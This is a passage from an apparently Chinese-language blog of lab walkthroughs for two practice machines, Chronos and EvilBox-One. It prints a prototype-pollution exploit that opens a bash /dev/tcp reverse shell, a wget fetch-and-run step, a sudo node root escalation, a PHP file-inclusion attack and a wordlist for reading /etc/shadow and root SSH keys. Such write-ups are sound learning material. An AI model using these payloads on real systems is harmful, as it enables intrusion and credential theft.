<li>express-fileupload 模块 express 框架下使用的中间件，用于文件上传</li>
</ul>
</li>
<li><code>server.js</code> 显示运行时监听的是靶机的本地 <code>127.0.0.1</code> 8080 端口</li>
</ul>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.56.102/7778 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch exp3.py</span><br><span class="line">vim exp3.py</span><br><span class="line">python3 -m http.server 8080</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 7778</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.56.102:8080/exp3.py</span><br><span class="line">python3 exp3.py</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">imera@chronos:~$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</span><br></pre></td></tr></table></figure>

<p>为了提升到root权限 Linux下提权有三种方式</p>
<p> 1、内核漏洞  2、利用suid权限配置不当	3、利用sudo权限不谨慎的地方</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">imera@chronos:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for imera on chronos:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User imera may run the following commands on chronos:</span><br><span class="line">    (ALL) NOPASSWD: /usr/local/bin/npm *</span><br><span class="line">    (ALL) NOPASSWD: /usr/local/bin/node *</span><br></pre></td></tr></table></figure>

<p>node代码提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo node -e &#x27;child_process.spawn(&quot;/bin/bash&quot;,&#123;stdio:[0,1,2]&#125;)&#x27;</span><br></pre></td></tr></table></figure>

<p>python交互式shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@chronos:/root# cat root.txt</span><br><span class="line">cat root.txt</span><br><span class="line">YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</span><br></pre></td></tr></table></figure>

<p><img src="/../images/30-pennnnnnnnnnntest/image-20230710215748698.png" alt="image-20230710215748698"></p>
<h1 id="靶机-EvilBox—One"><a href="#靶机-EvilBox—One" class="headerlink" title="靶机: EvilBox—One"></a>靶机: EvilBox—One</h1><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/shadow-/p/16878609.html" >https://www.cnblogs.com/shadow-/p/16878609.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/upfine/p/16929756.html" >https://www.cnblogs.com/upfine/p/16929756.html<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -I eth0</span><br><span class="line">nmap -sV 192.168.56.105</span><br><span class="line">dirsearch -u &quot;http://192.168.56.105/&quot; -x 403</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[01:16:29] Starting: </span><br><span class="line">[01:16:47] 200 -   10KB - /index.html                               </span><br><span class="line">[01:16:54] 200 -   12B  - /robots.txt                               </span><br><span class="line">[01:16:54] 301 -  317B  - /secret  -&gt; http://192.168.56.105/secret/ </span><br><span class="line">[01:16:54] 200 -    4B  - /secret/ </span><br><span class="line">Task Completed                      </span><br></pre></td></tr></table></figure>





<p>seclists</p>
<p>gobuster</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists" >https://github.com/danielmiessler/SecLists<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir --url=&#x27;192.168.56.105:80/secret&#x27; -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/usr/share]</span><br><span class="line">└─# gobuster dir --url=&#x27;192.168.56.105:80/secret&#x27; -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.5</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.56.105:80/secret</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.5</span><br><span class="line">[+] Extensions:              txt,php,html,jsp</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2023/07/13 02:55:43 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.html                (Status: 403) [Size: 279]</span><br><span class="line">/.php                 (Status: 403) [Size: 279]</span><br><span class="line">/index.html           (Status: 200) [Size: 4]</span><br><span class="line">/evil.php             (Status: 200) [Size: 0]</span><br><span class="line">Progress: 707006 / 708545 (99.78%)</span><br><span class="line">===============================================================</span><br><span class="line">2023/07/13 02:57:40 Finished</span><br><span class="line">===============================================================</span><br><span class="line">                                                                   </span><br></pre></td></tr></table></figure>



<p>ffuf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">a</span><br><span class="line">&#x27;</span><br><span class="line">&quot;</span><br><span class="line">(</span><br><span class="line">[</span><br><span class="line">&#123;</span><br><span class="line">&lt;</span><br><span class="line">,</span><br><span class="line">;</span><br><span class="line">?</span><br><span class="line">`</span><br><span class="line">/</span><br><span class="line">\</span><br><span class="line">%</span><br><span class="line">ture</span><br><span class="line">false</span><br><span class="line">../robots.txt</span><br><span class="line">H4x0r</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:params -w ./var.txt:var -u http://192.168.56.105/secret/evil.php?params=var -fs 0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[Status: 200, Size: 12, Words: 2, Lines: 2, Duration: 21ms]</span><br><span class="line">    * params: command</span><br><span class="line">    * var: ../robots.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.105/secret/evil.php?command=../robots.txt</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://192.168.56.105/secret/evil.php?command=php://filter/read=convert.base64-encode/resource=../robots.txt&quot;</span><br><span class="line"></span><br><span class="line">curl &quot;http://192.168.56.105/secret/evil.php?command=php://filter/read=convert.base64-encode/resource=./evil.php&quot; -m 1 -s | base64 --decode</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename = $_GET[&#x27;command&#x27;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>





<h3 id="linux路径字典-file-txt"><a href="#linux路径字典-file-txt" class="headerlink" title="linux路径字典 file.txt"></a>linux路径字典 file.txt</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line">/apache/apache/conf/httpd.conf</span><br><span class="line">/apache/apache2/conf/httpd.conf</span><br><span class="line">/apache/php/php.ini</span><br><span class="line">/bin/php.ini</span><br><span class="line">/etc/anacrontab</span><br><span class="line">/etc/apache/apache.conf</span><br><span class="line">/etc/apache/httpd.conf</span><br><span class="line">/etc/apache2/apache.conf</span><br><span class="line">/etc/apache2/httpd.conf</span><br><span class="line">/etc/apache2/sites-available/<span class="keyword">default</span></span><br><span class="line">/etc/apache2/vhosts.d/00_default_vhost.conf</span><br><span class="line">/etc/at.allow</span><br><span class="line">/etc/at.deny</span><br><span class="line">/etc/cron.allow</span><br><span class="line">/etc/cron.deny</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/fstab</span><br><span class="line">/etc/host.conf</span><br><span class="line">/etc/httpd/conf.d/httpd.conf</span><br><span class="line">/etc/httpd/conf.d/php.conf</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">/etc/httpd/htdocs/index.html</span><br><span class="line">/etc/httpd/htdocs/index.php</span><br><span class="line">/etc/httpd/logs/access.log</span><br><span class="line">/etc/httpd/logs/access_log</span><br><span class="line">/etc/httpd/logs/error.log</span><br><span class="line">/etc/httpd/logs/error_log</span><br><span class="line">/etc/httpd/php.ini</span><br><span class="line">/etc/init.d/httpd</span><br><span class="line">/etc/init.d/mysql</span><br><span class="line">/etc/ld.so.conf</span><br><span class="line">/etc/motd</span><br><span class="line">/etc/my.cnf</span><br><span class="line">/etc/mysql/my.cnf</span><br><span class="line">/etc/mysql/my.cnf</span><br><span class="line">/etc/network/interfaces</span><br><span class="line">/etc/networks</span><br><span class="line">/etc/passwd</span><br><span class="line">/etc/php.ini</span><br><span class="line">/etc/php/apache/php.ini</span><br><span class="line">/etc/php/apache2/php.ini</span><br><span class="line">/etc/php/cgi/php.ini</span><br><span class="line">/etc/php/php.ini</span><br><span class="line">/etc/php/php4/php.ini</span><br><span class="line">/etc/php4<span class="number">.4</span>/fcgi/php.ini</span><br><span class="line">/etc/php4/apache/php.ini</span><br><span class="line">/etc/php4/apache2/php.ini</span><br><span class="line">/etc/php4/cgi/php.ini</span><br><span class="line">/etc/php5/apache/php.ini</span><br><span class="line">/etc/php5/apache2/php.ini</span><br><span class="line">/etc/php5/cgi/php.ini</span><br><span class="line">/etc/phpmyadmin/config.inc.php</span><br><span class="line">/etc/resolv.conf</span><br><span class="line">/etc/shadow</span><br><span class="line">/etc/ssh/sshd_config</span><br><span class="line">/etc/ssh/ssh_config</span><br><span class="line">/etc/ssh/ssh_host_dsa_key</span><br><span class="line">/etc/ssh/ssh_host_dsa_key</span><br><span class="line">/etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line">/etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line">/etc/ssh/ssh_host_key</span><br><span class="line">/etc/ssh/ssh_host_key</span><br><span class="line">/etc/ssh/ssh_host_key.pub</span><br><span class="line">/etc/ssh/ssh_host_key.pub</span><br><span class="line">/etc/ssh/ssh_host_rsa_key</span><br><span class="line">/etc/ssh/ssh_host_rsa_key</span><br><span class="line">/etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line">/etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line">/etc/sysconfig/network</span><br><span class="line">/etc/sysconfig/network</span><br><span class="line">/home/apache/conf/httpd.conf</span><br><span class="line">/home/apache2/conf/httpd.conf</span><br><span class="line">/home/bin/stable/apache/php.ini</span><br><span class="line">/home2/bin/stable/apache/php.ini</span><br><span class="line">/NetServer/bin/stable/apache/php.ini</span><br><span class="line">/opt/www/conf/httpd.conf</span><br><span class="line">/opt/www/htdocs/index.html</span><br><span class="line">/opt/www/htdocs/index.php</span><br><span class="line">/opt/xampp/etc/php.ini</span><br><span class="line">/PHP/php.ini</span><br><span class="line">/php/php.ini</span><br><span class="line">/php4/php.ini</span><br><span class="line">/php5/php.ini</span><br><span class="line">/root/.atftp_history</span><br><span class="line">/root/.bashrc</span><br><span class="line">/root/.bash_history</span><br><span class="line">/root/.mysql_history</span><br><span class="line">/root/.nano_history</span><br><span class="line">/root/.php_history</span><br><span class="line">/root/.profile</span><br><span class="line">/root/.ssh/authorized_keys</span><br><span class="line">/root/.ssh/identity</span><br><span class="line">/root/.ssh/identity.pub</span><br><span class="line">/root/.ssh/id_dsa</span><br><span class="line">/root/.ssh/id_dsa.pub</span><br><span class="line">/root/.ssh/id_rsa</span><br><span class="line">/root/.ssh/id_rsa.pub</span><br><span class="line">/root/anaconda-ks.cfg</span><br><span class="line">/tmp/apache/htdocs/index.html</span><br><span class="line">/tmp/apache/htdocs/index.php</span><br><span class="line">/usr/lib/php.ini</span><br><span class="line">/usr/lib/php/php.ini</span><br><span class="line">/usr/local/apache/conf/httpd.conf</span><br><span class="line">/usr/local/apache/conf/php.ini</span><br><span class="line">/usr/local/apache/htdocs/index.html</span><br><span class="line">/usr/local/apache/htdocs/index.php</span><br><span class="line">/usr/local/apache/logs/access.log</span><br><span class="line">/usr/local/apache/logs/access_log</span><br><span class="line">/usr/local/apache/logs/access_logaccess_log.old</span><br><span class="line">/usr/local/apache/logs/error.log</span><br><span class="line">/usr/local/apache/logs/error_log</span><br><span class="line">/usr/local/apache/logs/error_logerror_log.old</span><br><span class="line">/usr/local/apache2/conf/httpd.conf</span><br><span class="line">/usr/local/apache2/conf/php.ini</span><br><span class="line">/usr/local/apache2/htdocs/index.html</span><br><span class="line">/usr/local/apache2/htdocs/index.php</span><br><span class="line">/usr/local/cpanel/logs</span><br><span class="line">/usr/local/cpanel/logs/access_log</span><br><span class="line">/usr/local/cpanel/logs/error_log</span><br><span class="line">/usr/local/cpanel/logs/license_log</span><br><span class="line">/usr/local/cpanel/logs/login_log</span><br><span class="line">/usr/local/cpanel/logs/stats_log</span><br><span class="line">/usr/local/cpanel/logs/stats_log</span><br><span class="line">/usr/local/etc/php.ini</span><br><span class="line">/usr/local/httpd/conf/httpd.conf</span><br><span class="line">/usr/local/httpd2<span class="number">.2</span>/htdocs/index.html</span><br><span class="line">/usr/local/httpd2<span class="number">.2</span>/htdocs/index.php</span><br><span class="line">/usr/local/lib/php.ini</span><br><span class="line">/usr/local/mysql/bin/mysql</span><br><span class="line">/usr/local/mysql/my.cnf</span><br><span class="line">/usr/local/php/lib/php.ini</span><br><span class="line">/usr/local/php4/lib/php.ini</span><br><span class="line">/usr/local/php4/lib/php.ini</span><br><span class="line">/usr/local/php4/php.ini</span><br><span class="line">/usr/local/php5/etc/php.ini</span><br><span class="line">/usr/local/php5/lib/php.ini</span><br><span class="line">/usr/local/php5/php5.ini</span><br><span class="line">/usr/local/share/examples/php/php.ini</span><br><span class="line">/usr/local/share/examples/php4/php.ini</span><br><span class="line">/usr/local/tomcat5527/bin/version.sh</span><br><span class="line">/usr/local/Zend/etc/php.ini</span><br><span class="line">/usr/share/tomcat6/bin/startup.sh</span><br><span class="line">/usr/tomcat6/bin/startup.sh</span><br><span class="line">/<span class="keyword">var</span>/apache2/config.inc</span><br><span class="line">/<span class="keyword">var</span>/httpd/conf/httpd.conf</span><br><span class="line">/<span class="keyword">var</span>/httpd/conf/php.ini</span><br><span class="line">/<span class="keyword">var</span>/httpd/conf/php.ini</span><br><span class="line">/<span class="keyword">var</span>/httpd/htdocs/index.html</span><br><span class="line">/<span class="keyword">var</span>/httpd/htdocs/index.php</span><br><span class="line">/<span class="keyword">var</span>/lib/mysql/my.cnf</span><br><span class="line">/<span class="keyword">var</span>/lib/mysql/mysql/user.MYD</span><br><span class="line">/<span class="keyword">var</span>/local/www/conf/httpd.conf</span><br><span class="line">/<span class="keyword">var</span>/local/www/conf/php.ini</span><br><span class="line">/<span class="keyword">var</span>/log/access.log</span><br><span class="line">/<span class="keyword">var</span>/log/access_log</span><br><span class="line">/<span class="keyword">var</span>/log/apache/access.log</span><br><span class="line">/<span class="keyword">var</span>/log/apache/access_log</span><br><span class="line">/<span class="keyword">var</span>/log/apache/error.log</span><br><span class="line">/<span class="keyword">var</span>/log/apache/error_log</span><br><span class="line">/<span class="keyword">var</span>/log/apache2/access.log</span><br><span class="line">/<span class="keyword">var</span>/log/apache2/access_log</span><br><span class="line">/<span class="keyword">var</span>/log/apache2/error.log</span><br><span class="line">/<span class="keyword">var</span>/log/apache2/error_log</span><br><span class="line">/<span class="keyword">var</span>/log/error.log</span><br><span class="line">/<span class="keyword">var</span>/log/error_log</span><br><span class="line">/<span class="keyword">var</span>/log/mysql.log</span><br><span class="line">/<span class="keyword">var</span>/log/mysql/mysql-bin.log</span><br><span class="line">/<span class="keyword">var</span>/log/mysql/mysql-slow.log</span><br><span class="line">/<span class="keyword">var</span>/log/mysql/mysql.log</span><br><span class="line">/<span class="keyword">var</span>/log/mysqlderror.log</span><br><span class="line">/<span class="keyword">var</span>/mail/root</span><br><span class="line">/<span class="keyword">var</span>/mysql.log</span><br><span class="line">/<span class="keyword">var</span>/spool/cron/crontabs/root</span><br><span class="line">/<span class="keyword">var</span>/spool/mail/root</span><br><span class="line">/<span class="keyword">var</span>/www/conf/httpd.conf</span><br><span class="line">/<span class="keyword">var</span>/www/htdocs/index.html</span><br><span class="line">/<span class="keyword">var</span>/www/htdocs/index.php</span><br><span class="line">/<span class="keyword">var</span>/www/index.html</span><br><span class="line">/<span class="keyword">var</span>/www/index.php</span><br><span class="line">/<span class="keyword">var</span>/www/logs/access.log</span><br><span class="line">/<span class="keyword">var</span>/www/logs/access_log</span><br><span class="line">/<span class="keyword">var</span>/www/logs/error.log</span><br><span class="line">/<span class="keyword">var</span>/www/logs/error_log</span><br><span class="line">/web/conf/php.ini</span><br><span class="line">/www/conf/httpd.conf</span><br><span class="line">/www/htdocs/index.html</span><br><span class="line">/www/htdocs/index.php</span><br><span class="line">/www/php/php.ini</span><br><span class="line">/www/php4/php.ini</span><br><span class="line">/www/php5/php.ini</span><br><span class="line">/xampp/apache/bin/php.ini</span><br><span class="line">/xampp/apache/conf/httpd.conf</span><br><span class="line">root/.ssh/authorized_keys</span><br><span class="line">root/.ssh/identity</span><br><span class="line">root/.ssh/identity.pub</span><br><span class="line">root/.ssh/id_dsa</span><br><span class="line">root/.ssh/id_dsa.pub</span><br><span class="line">root/.ssh/id_rsa</span><br><span class="line">root/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for i in $(cat ./file.txt)</span><br><span class="line">do</span><br><span class="line">	echo &quot;#######################&quot;</span><br><span class="line">	echo &quot;&gt;&gt;&gt;$i:&quot;</span><br><span class="line">	curl &quot;http://192.168.56.105/secret/evil.php?command=$i&quot; -m 1 -s</span><br><span class="line">	sleep 1</span><br><span class="line">done</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span 